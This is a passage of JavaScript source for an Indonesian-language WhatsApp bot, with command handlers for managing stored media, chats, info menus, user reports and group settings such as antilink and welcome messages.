				if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
					try {
	if (!svst) return reply('Nama gambar nya apa?')
	svst = args.join(" ")
					 wanu = imagi.indexOf(svst)
					 imagenye.splice(wanu, 1)
					 fs.unlinkSync(`./strg/image/${svst}.jpeg`)
					 reply(`Sukses menghapus image ${svst}`)
					} catch (err){
						console.log(err)
						replysticker(errorstc)
					}
					break
					case 'delvideo':
				if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
					try {
if (!svst) return reply('Nama video nya apa?')
	svst = args.join(" ")
					 wanu = imagi.indexOf(svst)
					 videonye.splice(wanu, 1)
					 fs.unlinkSync(`./strg/video/${svst}.mp4`)
					 reply(`Sukses menghapus image ${svst}`)
					} catch (err){
						console.log(err)
						replysticker(errorstc)
					}
					break
case 'addvn':  // Fix Bug By LUCBOT & LUC
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedAudio) return reply('Reply vnnya blokk!')
svst = args.join(" ")
if (!svst) return reply('Nama audionya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
audionye.push(`${svst}`)
fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
reply(`\`\`\`Sukses Menambahkan VN\nCek Dengan Cara ${prefix}listvn\`\`\``)
break
case 'addimg':
case 'addimage':  // Fix Bug By Luc
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedImage) return reply('Reply imagenya blokk!')
svst = args.join(" ")
if (!svst) return reply('Nama imagenya apa?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
imagenye.push(`${svst}`)
fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
reply(`\`\`\`Sukses Menambahkan Image\nCek Dengan Cara ${prefix}listimage\`\`\``)
break
case 'addvideo':  // Fix Bug By Luc
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)  
if (!isQuotedVideo) return reply('Reply videonya blokk!')
svst = args.join(" ")
if (!svst) return reply('Nama videonya apa su?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await client.downloadMediaMessage(boij)
videonye.push(`${svst}`)
fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
reply(`\`\`\`Sukses Menambahkan Video\nCek Dengan Cara ${prefix}listvideo\`\`\``)
break

//********** SETTING SISTEM **********		
case 'readall':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
 var chats = await client.chats.all()
chats.map( async ({ jid }) => {
await client.chatRead(jid)
})
replysticker(successtc)
 console.log(chats.length)
break
case 'mute':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.mute, 24*60*60*1000)
replysticker(successtc)
console.log('succes mute chat = ' + from)
break
 case 'unmute':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.unmute)
replysticker(successtc)
console.log('succes unmute chat = ' + from)
break
case 'unpin':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.unpin)
replysticker(successtc)
console.log('unpin chat = ' + from)
break	   	
 case 'pin':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
client.modifyChat(from, ChatModification.pin)
replysticker(successtc)
console.log('pinned chat = ' + from)
break
 case 'unreadall':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
var chats = await client.chats.all()
chats.map( async ({ jid }) => {
await client.chatRead(jid, 'unread')
})
replysticker(successtc)
console.log(chats.length)
break
case 'unarchive':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes unarchive chat = ' + from)
anu = await client.chats.all()
for (let _ of anu) {
client.modifyChat(_.jid, ChatModification.unarchive)
}
break
case 'archive':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes archive chat = ' + from)
await sleep(3000)
client.modifyChat(from, ChatModification.archive)
break
case 'delpc':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
replysticker(successtc)
console.log('succes delete chat = ' + from)
await sleep(4000)
client.modifyChat(from, ChatModification.delete)
break	
case 'clearall':  
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
anu = await client.chats.all()
client.setMaxListeners(99)
for (let _ of anu) {
client.modifyChat(_.jid, ChatModification.delete)
}
replysticker(successtc)
break
case 'listcmd':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
let teksnyee = `*LIST STICKER CMD*`
let cemde1 = [];
for (let i of scommand) {
cemde1.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
sendButtonImageLoc(from, buttonsmenu5, teksnyee, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'listrepson':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isOwner) return replysticker(ownerstc)
let teksnyeee = `*LIST RESPON CMD*`
let rcemde1 = [];
for (let i of commandsrespon) {
rcemde1.push(i.pesan)
teksnyeee += `\n\n*•> ID :* ${i.pesan}\n*•> Cmd :* ${i.balasan}`
}
sendButtonImageLoc(from, buttonsmenu5, teksnyeee, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
//********** INFO MENU **********
case 'bahasa':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, ind.bahasa(), buttonsmenu1, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break 
case 'donasi':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from,  buttonsmenu5, ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'rules':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, ind.rules(player, hahh, dev, numbernye), buttonsmenu1, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break
case 'gcbot':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `*${hahh} @${player.split("@")[0]}*`, ind.gcofficial(player, hahh, dev, numbernye), buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break
case 'jokigb':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply('ketik permintaan kamu')
const cdsafrr = args.join(" ")
if (cdsafrr.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
var nomor = mek.participant
const ressdas = `*[ HELP ]*\n*Nomor :@${player.split("@")[0]}*\n Id: ${cdsafrr}`
var options = {
text: ressdas,
contextInfo: {mentionedJid: [nomor]},
}
client.sendMessage('6289530298948@s.whatsapp.net', options, text, {quoted: fdoc, contextInfo :{sendEphemeral: true, mentionedJid: [player, dev]}})
reply(`*REQUEST ANDA TELAH SAMPAI KE ADMIN*\n*Harap Bersabar Karna Pesan Akan Dibaca Dari Bawah*`)
break
case 'request':
case 'laporan':
case 'bugreport':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply('ketik permintaan kamu')
const cfrr = args.join(" ")
if (cfrr.length > 300) return client.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
var nomor = mek.participant
const ress = `* [ LAPORAN ] *\n*Nomor :@${player.split("@")[0]}*\nPesan : ${cfrr}`
var options = {
text: ress,
contextInfo: {mentionedJid: [nomor]},
}
client.sendMessage('6289530298948@s.whatsapp.net', options, text, {quoted: fdoc, contextInfo :{sendEphemeral: true, mentionedJid: [player, dev]}})
reply(`*REQUEST ANDA TELAH SAMPAI KE OWNER @${dev.split("@")[0]}*\nPesan : ${cfrr}\n*Requests palsu atau main² tidak akan ditanggapi.*`)
break
case 'profile':
case 'profil':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing)
try {
ppimg = await client.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
profile = `╭─「 *PROFILE ANDA* 」\n│• *Name:* ${pushname}\n│• *XP:* ${getLevelingXp(sender)}\n│• *Level:* ${getLevelingLevel(sender)}\n│• *User Terdaftar:* ✓\n│• *Link:* wa.me/${sender.split("@")[0]}\n╰──────────────────`
buffer = await getBuffer(ppimg)
client.sendMessage(from, buffer, image, {quoted: fdoc, caption: profile, thumbnail: Buffer.alloc(0)})
break
case 'blocklist': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
client.updatePresence(from, Presence.composing) 
teks = '*BLOCKLIST:*\n'
for (let block of blocked) {
teks += `├❏@${block.split('@')[0]}\n`
}
teks += `└❏ *Total:* ${blocked.length}`
client.sendMessage(from, teks.trim(), extendedText, {quoted:fdoc, contextInfo: {"mentionedJid": blocked}})
break 
case 'premiumlist':
case 'listpremium':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
client.updatePresence(from, Presence.composing) 
teks = '*PREMIUM LIST* :\n'
for (let premm of prem) {
teks += `├❏ @${premm.split('@')[0]}\n`
}
teks += `└❏ *Total:* ${prem.length}`
client.sendMessage(from, teks.trim(), extendedText, {quoted:fdoc, contextInfo: {"mentionedJid": prem}})
break 
case 'listbadword':
case 'badword':
case 'badwordlist':
case 'badwordlist':// Fix Bug By Luc
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
let lbw = `*BAD WORD LIST*\n`
for (let i of bad) {
 lbw += `├❏ ${i.replace(bad)}\n`
}
teks += `└❏ *Total:* ${bad.length}`
client.sendMessage(from, lbw.trim(), extendedText, {quoted:fdoc})
break
case 'liststiker':
case 'liststicker':
case 'liststc':
case 'stikerlist':
case 'stickerlist':
case 'stclist':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": setiker } })
break
case 'videolist':
case 'listvideo':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
teks = '*List Video :*\n\n'
for (let awokwkwk of videonye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${videonye.length}* \n\n_Untuk mengambil video silahkan reply pesan ini dengan caption nama video_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": videonye } })
break
case 'listimage':
case 'imagelist':
case 'listimg':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
teks = '*List Image :*\n\n'
for (let awokwkwk of imagenye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${imagenye.length}* \n\n_Untuk mengambil video silahkan reply pesan ini dengan caption nama video_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": imagenye }, thumbnail: Buffer.alloc(0)})
break
case 'listvn':
case 'vnlist':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `├❏ ${awokwkwk}\n`
}
teks += `└❏ *Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
client.sendMessage(from, teks.trim(), extendedText, { quoted: fdoc, contextInfo: { "mentionedJid": audionye } })
break
case 'imunevirtex':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})  
if (isBanned) return replysticker(banstc) 
sendButtonImageLoc(from, antivirtexx(), buttonsmenu1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'jadibot':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})  
if (isBanned) return replysticker(banstc) 
sendButtonImageLoc(from, `Mau jadi bot beli jasan run bot ketik aja owner lalu chat, bisa set bot semaumu`, buttonsmenu1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'contributor':
case 'developer':
case 'author':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})  
if (isBanned) return replysticker(banstc) 
client.sendMessage(from, {
"displayName": "2 kontak",
"contacts": contri1 
}, 'contactsArrayMessage', { quoted: mek})
break
case 'owner':
case 'creator':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
client.sendMessage(from, {
"displayName": "jeff",
"contacts": contrii 
}, 'contactsArrayMessage', { quoted: mek})
break
case 'sc':
case 'scbot':
case 'source':
case 'sourcecode':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
sendButtonImageLoc(from, `Source Script Bot : ${github}`, buttonsmenu1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
break
case 'mystatus':             
case 'status':
case 'mystat':
case 'botstat':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)	
anu = process.uptime()
fkhs = sender
teks = ` *MY STATS*
*${hahh}*  @${player.split("@")[0]}
*TANGGAL :*  ${timu}
*WIB :*  ${wib}
*WITA :*  ${wita}
*WIT :*  ${wit}

*Server Name :*  ${client.browserDescription[0]}
*Server :*  ${client.browserDescription[1]}
*Prefix :*  ${prefix}
*Versi Bot :*  ${botver}

*Battery :*  ${battery.persen}
*Charger :*  ${battery.charger == true ? "sedang di cas" : "sedang tidak di cas"}
*Merk HP :*  ${device_manufacturer}
*Versi OS :*  ${os_version}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*Versi HP :*  ${device_model}
*MCC :*  ${mcc}
*MNC :*  ${mnc}

*Dev :*  @${dev.split("@")[0]}
*Owner :*  @${ow.split("@")[0]}
*Whatsapp :*  ${wa_version}
*Blockir :*  ${blocked.length} Blocked
*Group Chat :*  ${totalgroup.length} Chat
*Personal Chat :*  ${totalkontak.length} Chat
*Total Chat :*  ${totalchat.length} Chat
*Total User :*  ${_registered.length}
*Hit Today :*  ${luchit} Hit
*Total Hit :*  ${totalhit} chat
*Speed :*  ${latensii.toFixed(4)} Second
*Runtime :*  ${kyun(anu)}

*${banChats ? "SELF" : "PUBLIC"}*`
sendButtonImageLoc(from, teks, buttonsmenu1, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [player, numbernye, ow, dev]}})
break
//********** GROUP SETTING *********
case 'antilink':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === "on") {
if (AntiLink) return  reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
ntilink.push(from)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(ntilink))
fakegroup(`\`\`\`SUCCES MENGAKTIFKAN ANTILINK DI GROUP INI\`\`\``)
} else if (args[0] === "off") {
if (!AntiLink) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/group/antilink.json', JSON.stringify(ntilink))
fakegroup(`\`\`\`SUCCES MENONAKTIFKAN ANTILINK DI GROUP INI\`\`\``)
} else if (!q){
const mode134s31dds = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode134s31dds, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'event':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isEvento) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
eventtime.push(from)
fs.writeFileSync('./database/group/eventtime.json', JSON.stringify(eventtime))
fakegroup(`\`\`\`SUCCES MENGAKTIFKAN EVENT DI GROUP INI\`\`\``)
} else if (args[0] === 'off') {
if (!isEvento) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
eventtime.splice(from, 4)
fs.writeFileSync('./database/group/eventtime.json', JSON.stringify(eventtime))
fakegroup(`\`\`\`SUCCES MENONAKTIFKAN WELCOME DI GROUP INI\`\`\``)
} else if (!q){
const mode134s32we1 = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode134s32we1, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'welcome':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isWelkom) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
welkom.push(from)
fs.writeFileSync('./database/group/welkom.json', JSON.stringify(welkom))
fakegroup(`\`\`\`SUCCES MENGAKTIFKAN WELCOME DI GROUP INI\`\`\``)
} else if (args[0] === 'off') {
if (!isWelkom) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
welkom.splice(from, 4)
fs.writeFileSync('./database/group/welkom.json', JSON.stringify(welkom))
fakegroup(`\`\`\`SUCCES MENONAKTIFKAN WELCOME DI GROUP INI\`\`\``)
} else if (!q){
const mode13sd4s31 = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode13sd4s31, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'antivirtex': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isAntiVirtex) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
antivirtex.push(from)
fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(antivirtex))
fakegroup(`\`\`\`SUCCES MENGAKTIFKAN ANTILINK DI GROUP INI\`\`\``)
} else if (args[0] === 'off') {
if (!isAntiVirtex) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
antivirtex.splice(from, 4)
fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(antivirtex))
fakegroup(`\`\`\`SUCCES MENONAKTIFKAN WELCOME DI GROUP INI\`\`\``)
} else if (!q){
const mode134dsas31 = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode134dsas31, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'nobadword': 
case 'antitoxic': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`\`\`\`ketik ${prefix}${command} on atau ${prefix}${command} off \`\`\``)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'on') {
if (isBadWord) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
badword.push(from)
fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
fakegroup(`\`\`\`SUCCES MENGAKTIFKAN ANTILINK DI GROUP INI\`\`\``)
} else if (args[0] === 'off') {
if (!isBadWord) return reply(`\`\`\`COMMAND ALREADY USE\`\`\``)
badword.splice(from, 4)
fs.writeFileSync('./database/group/badword.json', JSON.stringify(badword))
fakegroup(`\`\`\`SUCCES MENONAKTIFKAN WELCOME DI GROUP INI\`\`\``)
} else if (!q){
const mode134s31sdsa = [{buttonId: `${command} on`,buttonText: {displayText: `ON`}, type: 1}, {buttonId: `${command} off`, buttonText: {displayText: `OFF`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode134s31sdsa, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'gc':
case 'group':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'buka') {
fakegroup(`\`\`\`SUCCES OPEN GROUP\`\`\``)
client.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
fakegroup(`\`\`\`SUCCES CLOESE GROUP\`\`\``)
client.groupSettingChange(from, GroupSettingChange.messageSend, true)
} else if (!q){
const mode134sa31 = [{buttonId: `${command} buka`,buttonText: {displayText: `OPEN`}, type: 1}, {buttonId: `${command} tutup`, buttonText: {displayText: `CLOSE`}, type: 1},]
await sendButtonText(from, `_Pilih Mode Di Bawah Ini_`, buttonsmenu1, mode134sa31, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}
await confirmLIMIT(sender, [angka])
break
case 'revoke':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.revokeInvite(from)
fakegroup(`\`\`\`SUCCES REVOKE LINK GROUP\`\`\``)
await confirmLIMIT(sender, [angka])
break
case 'add':
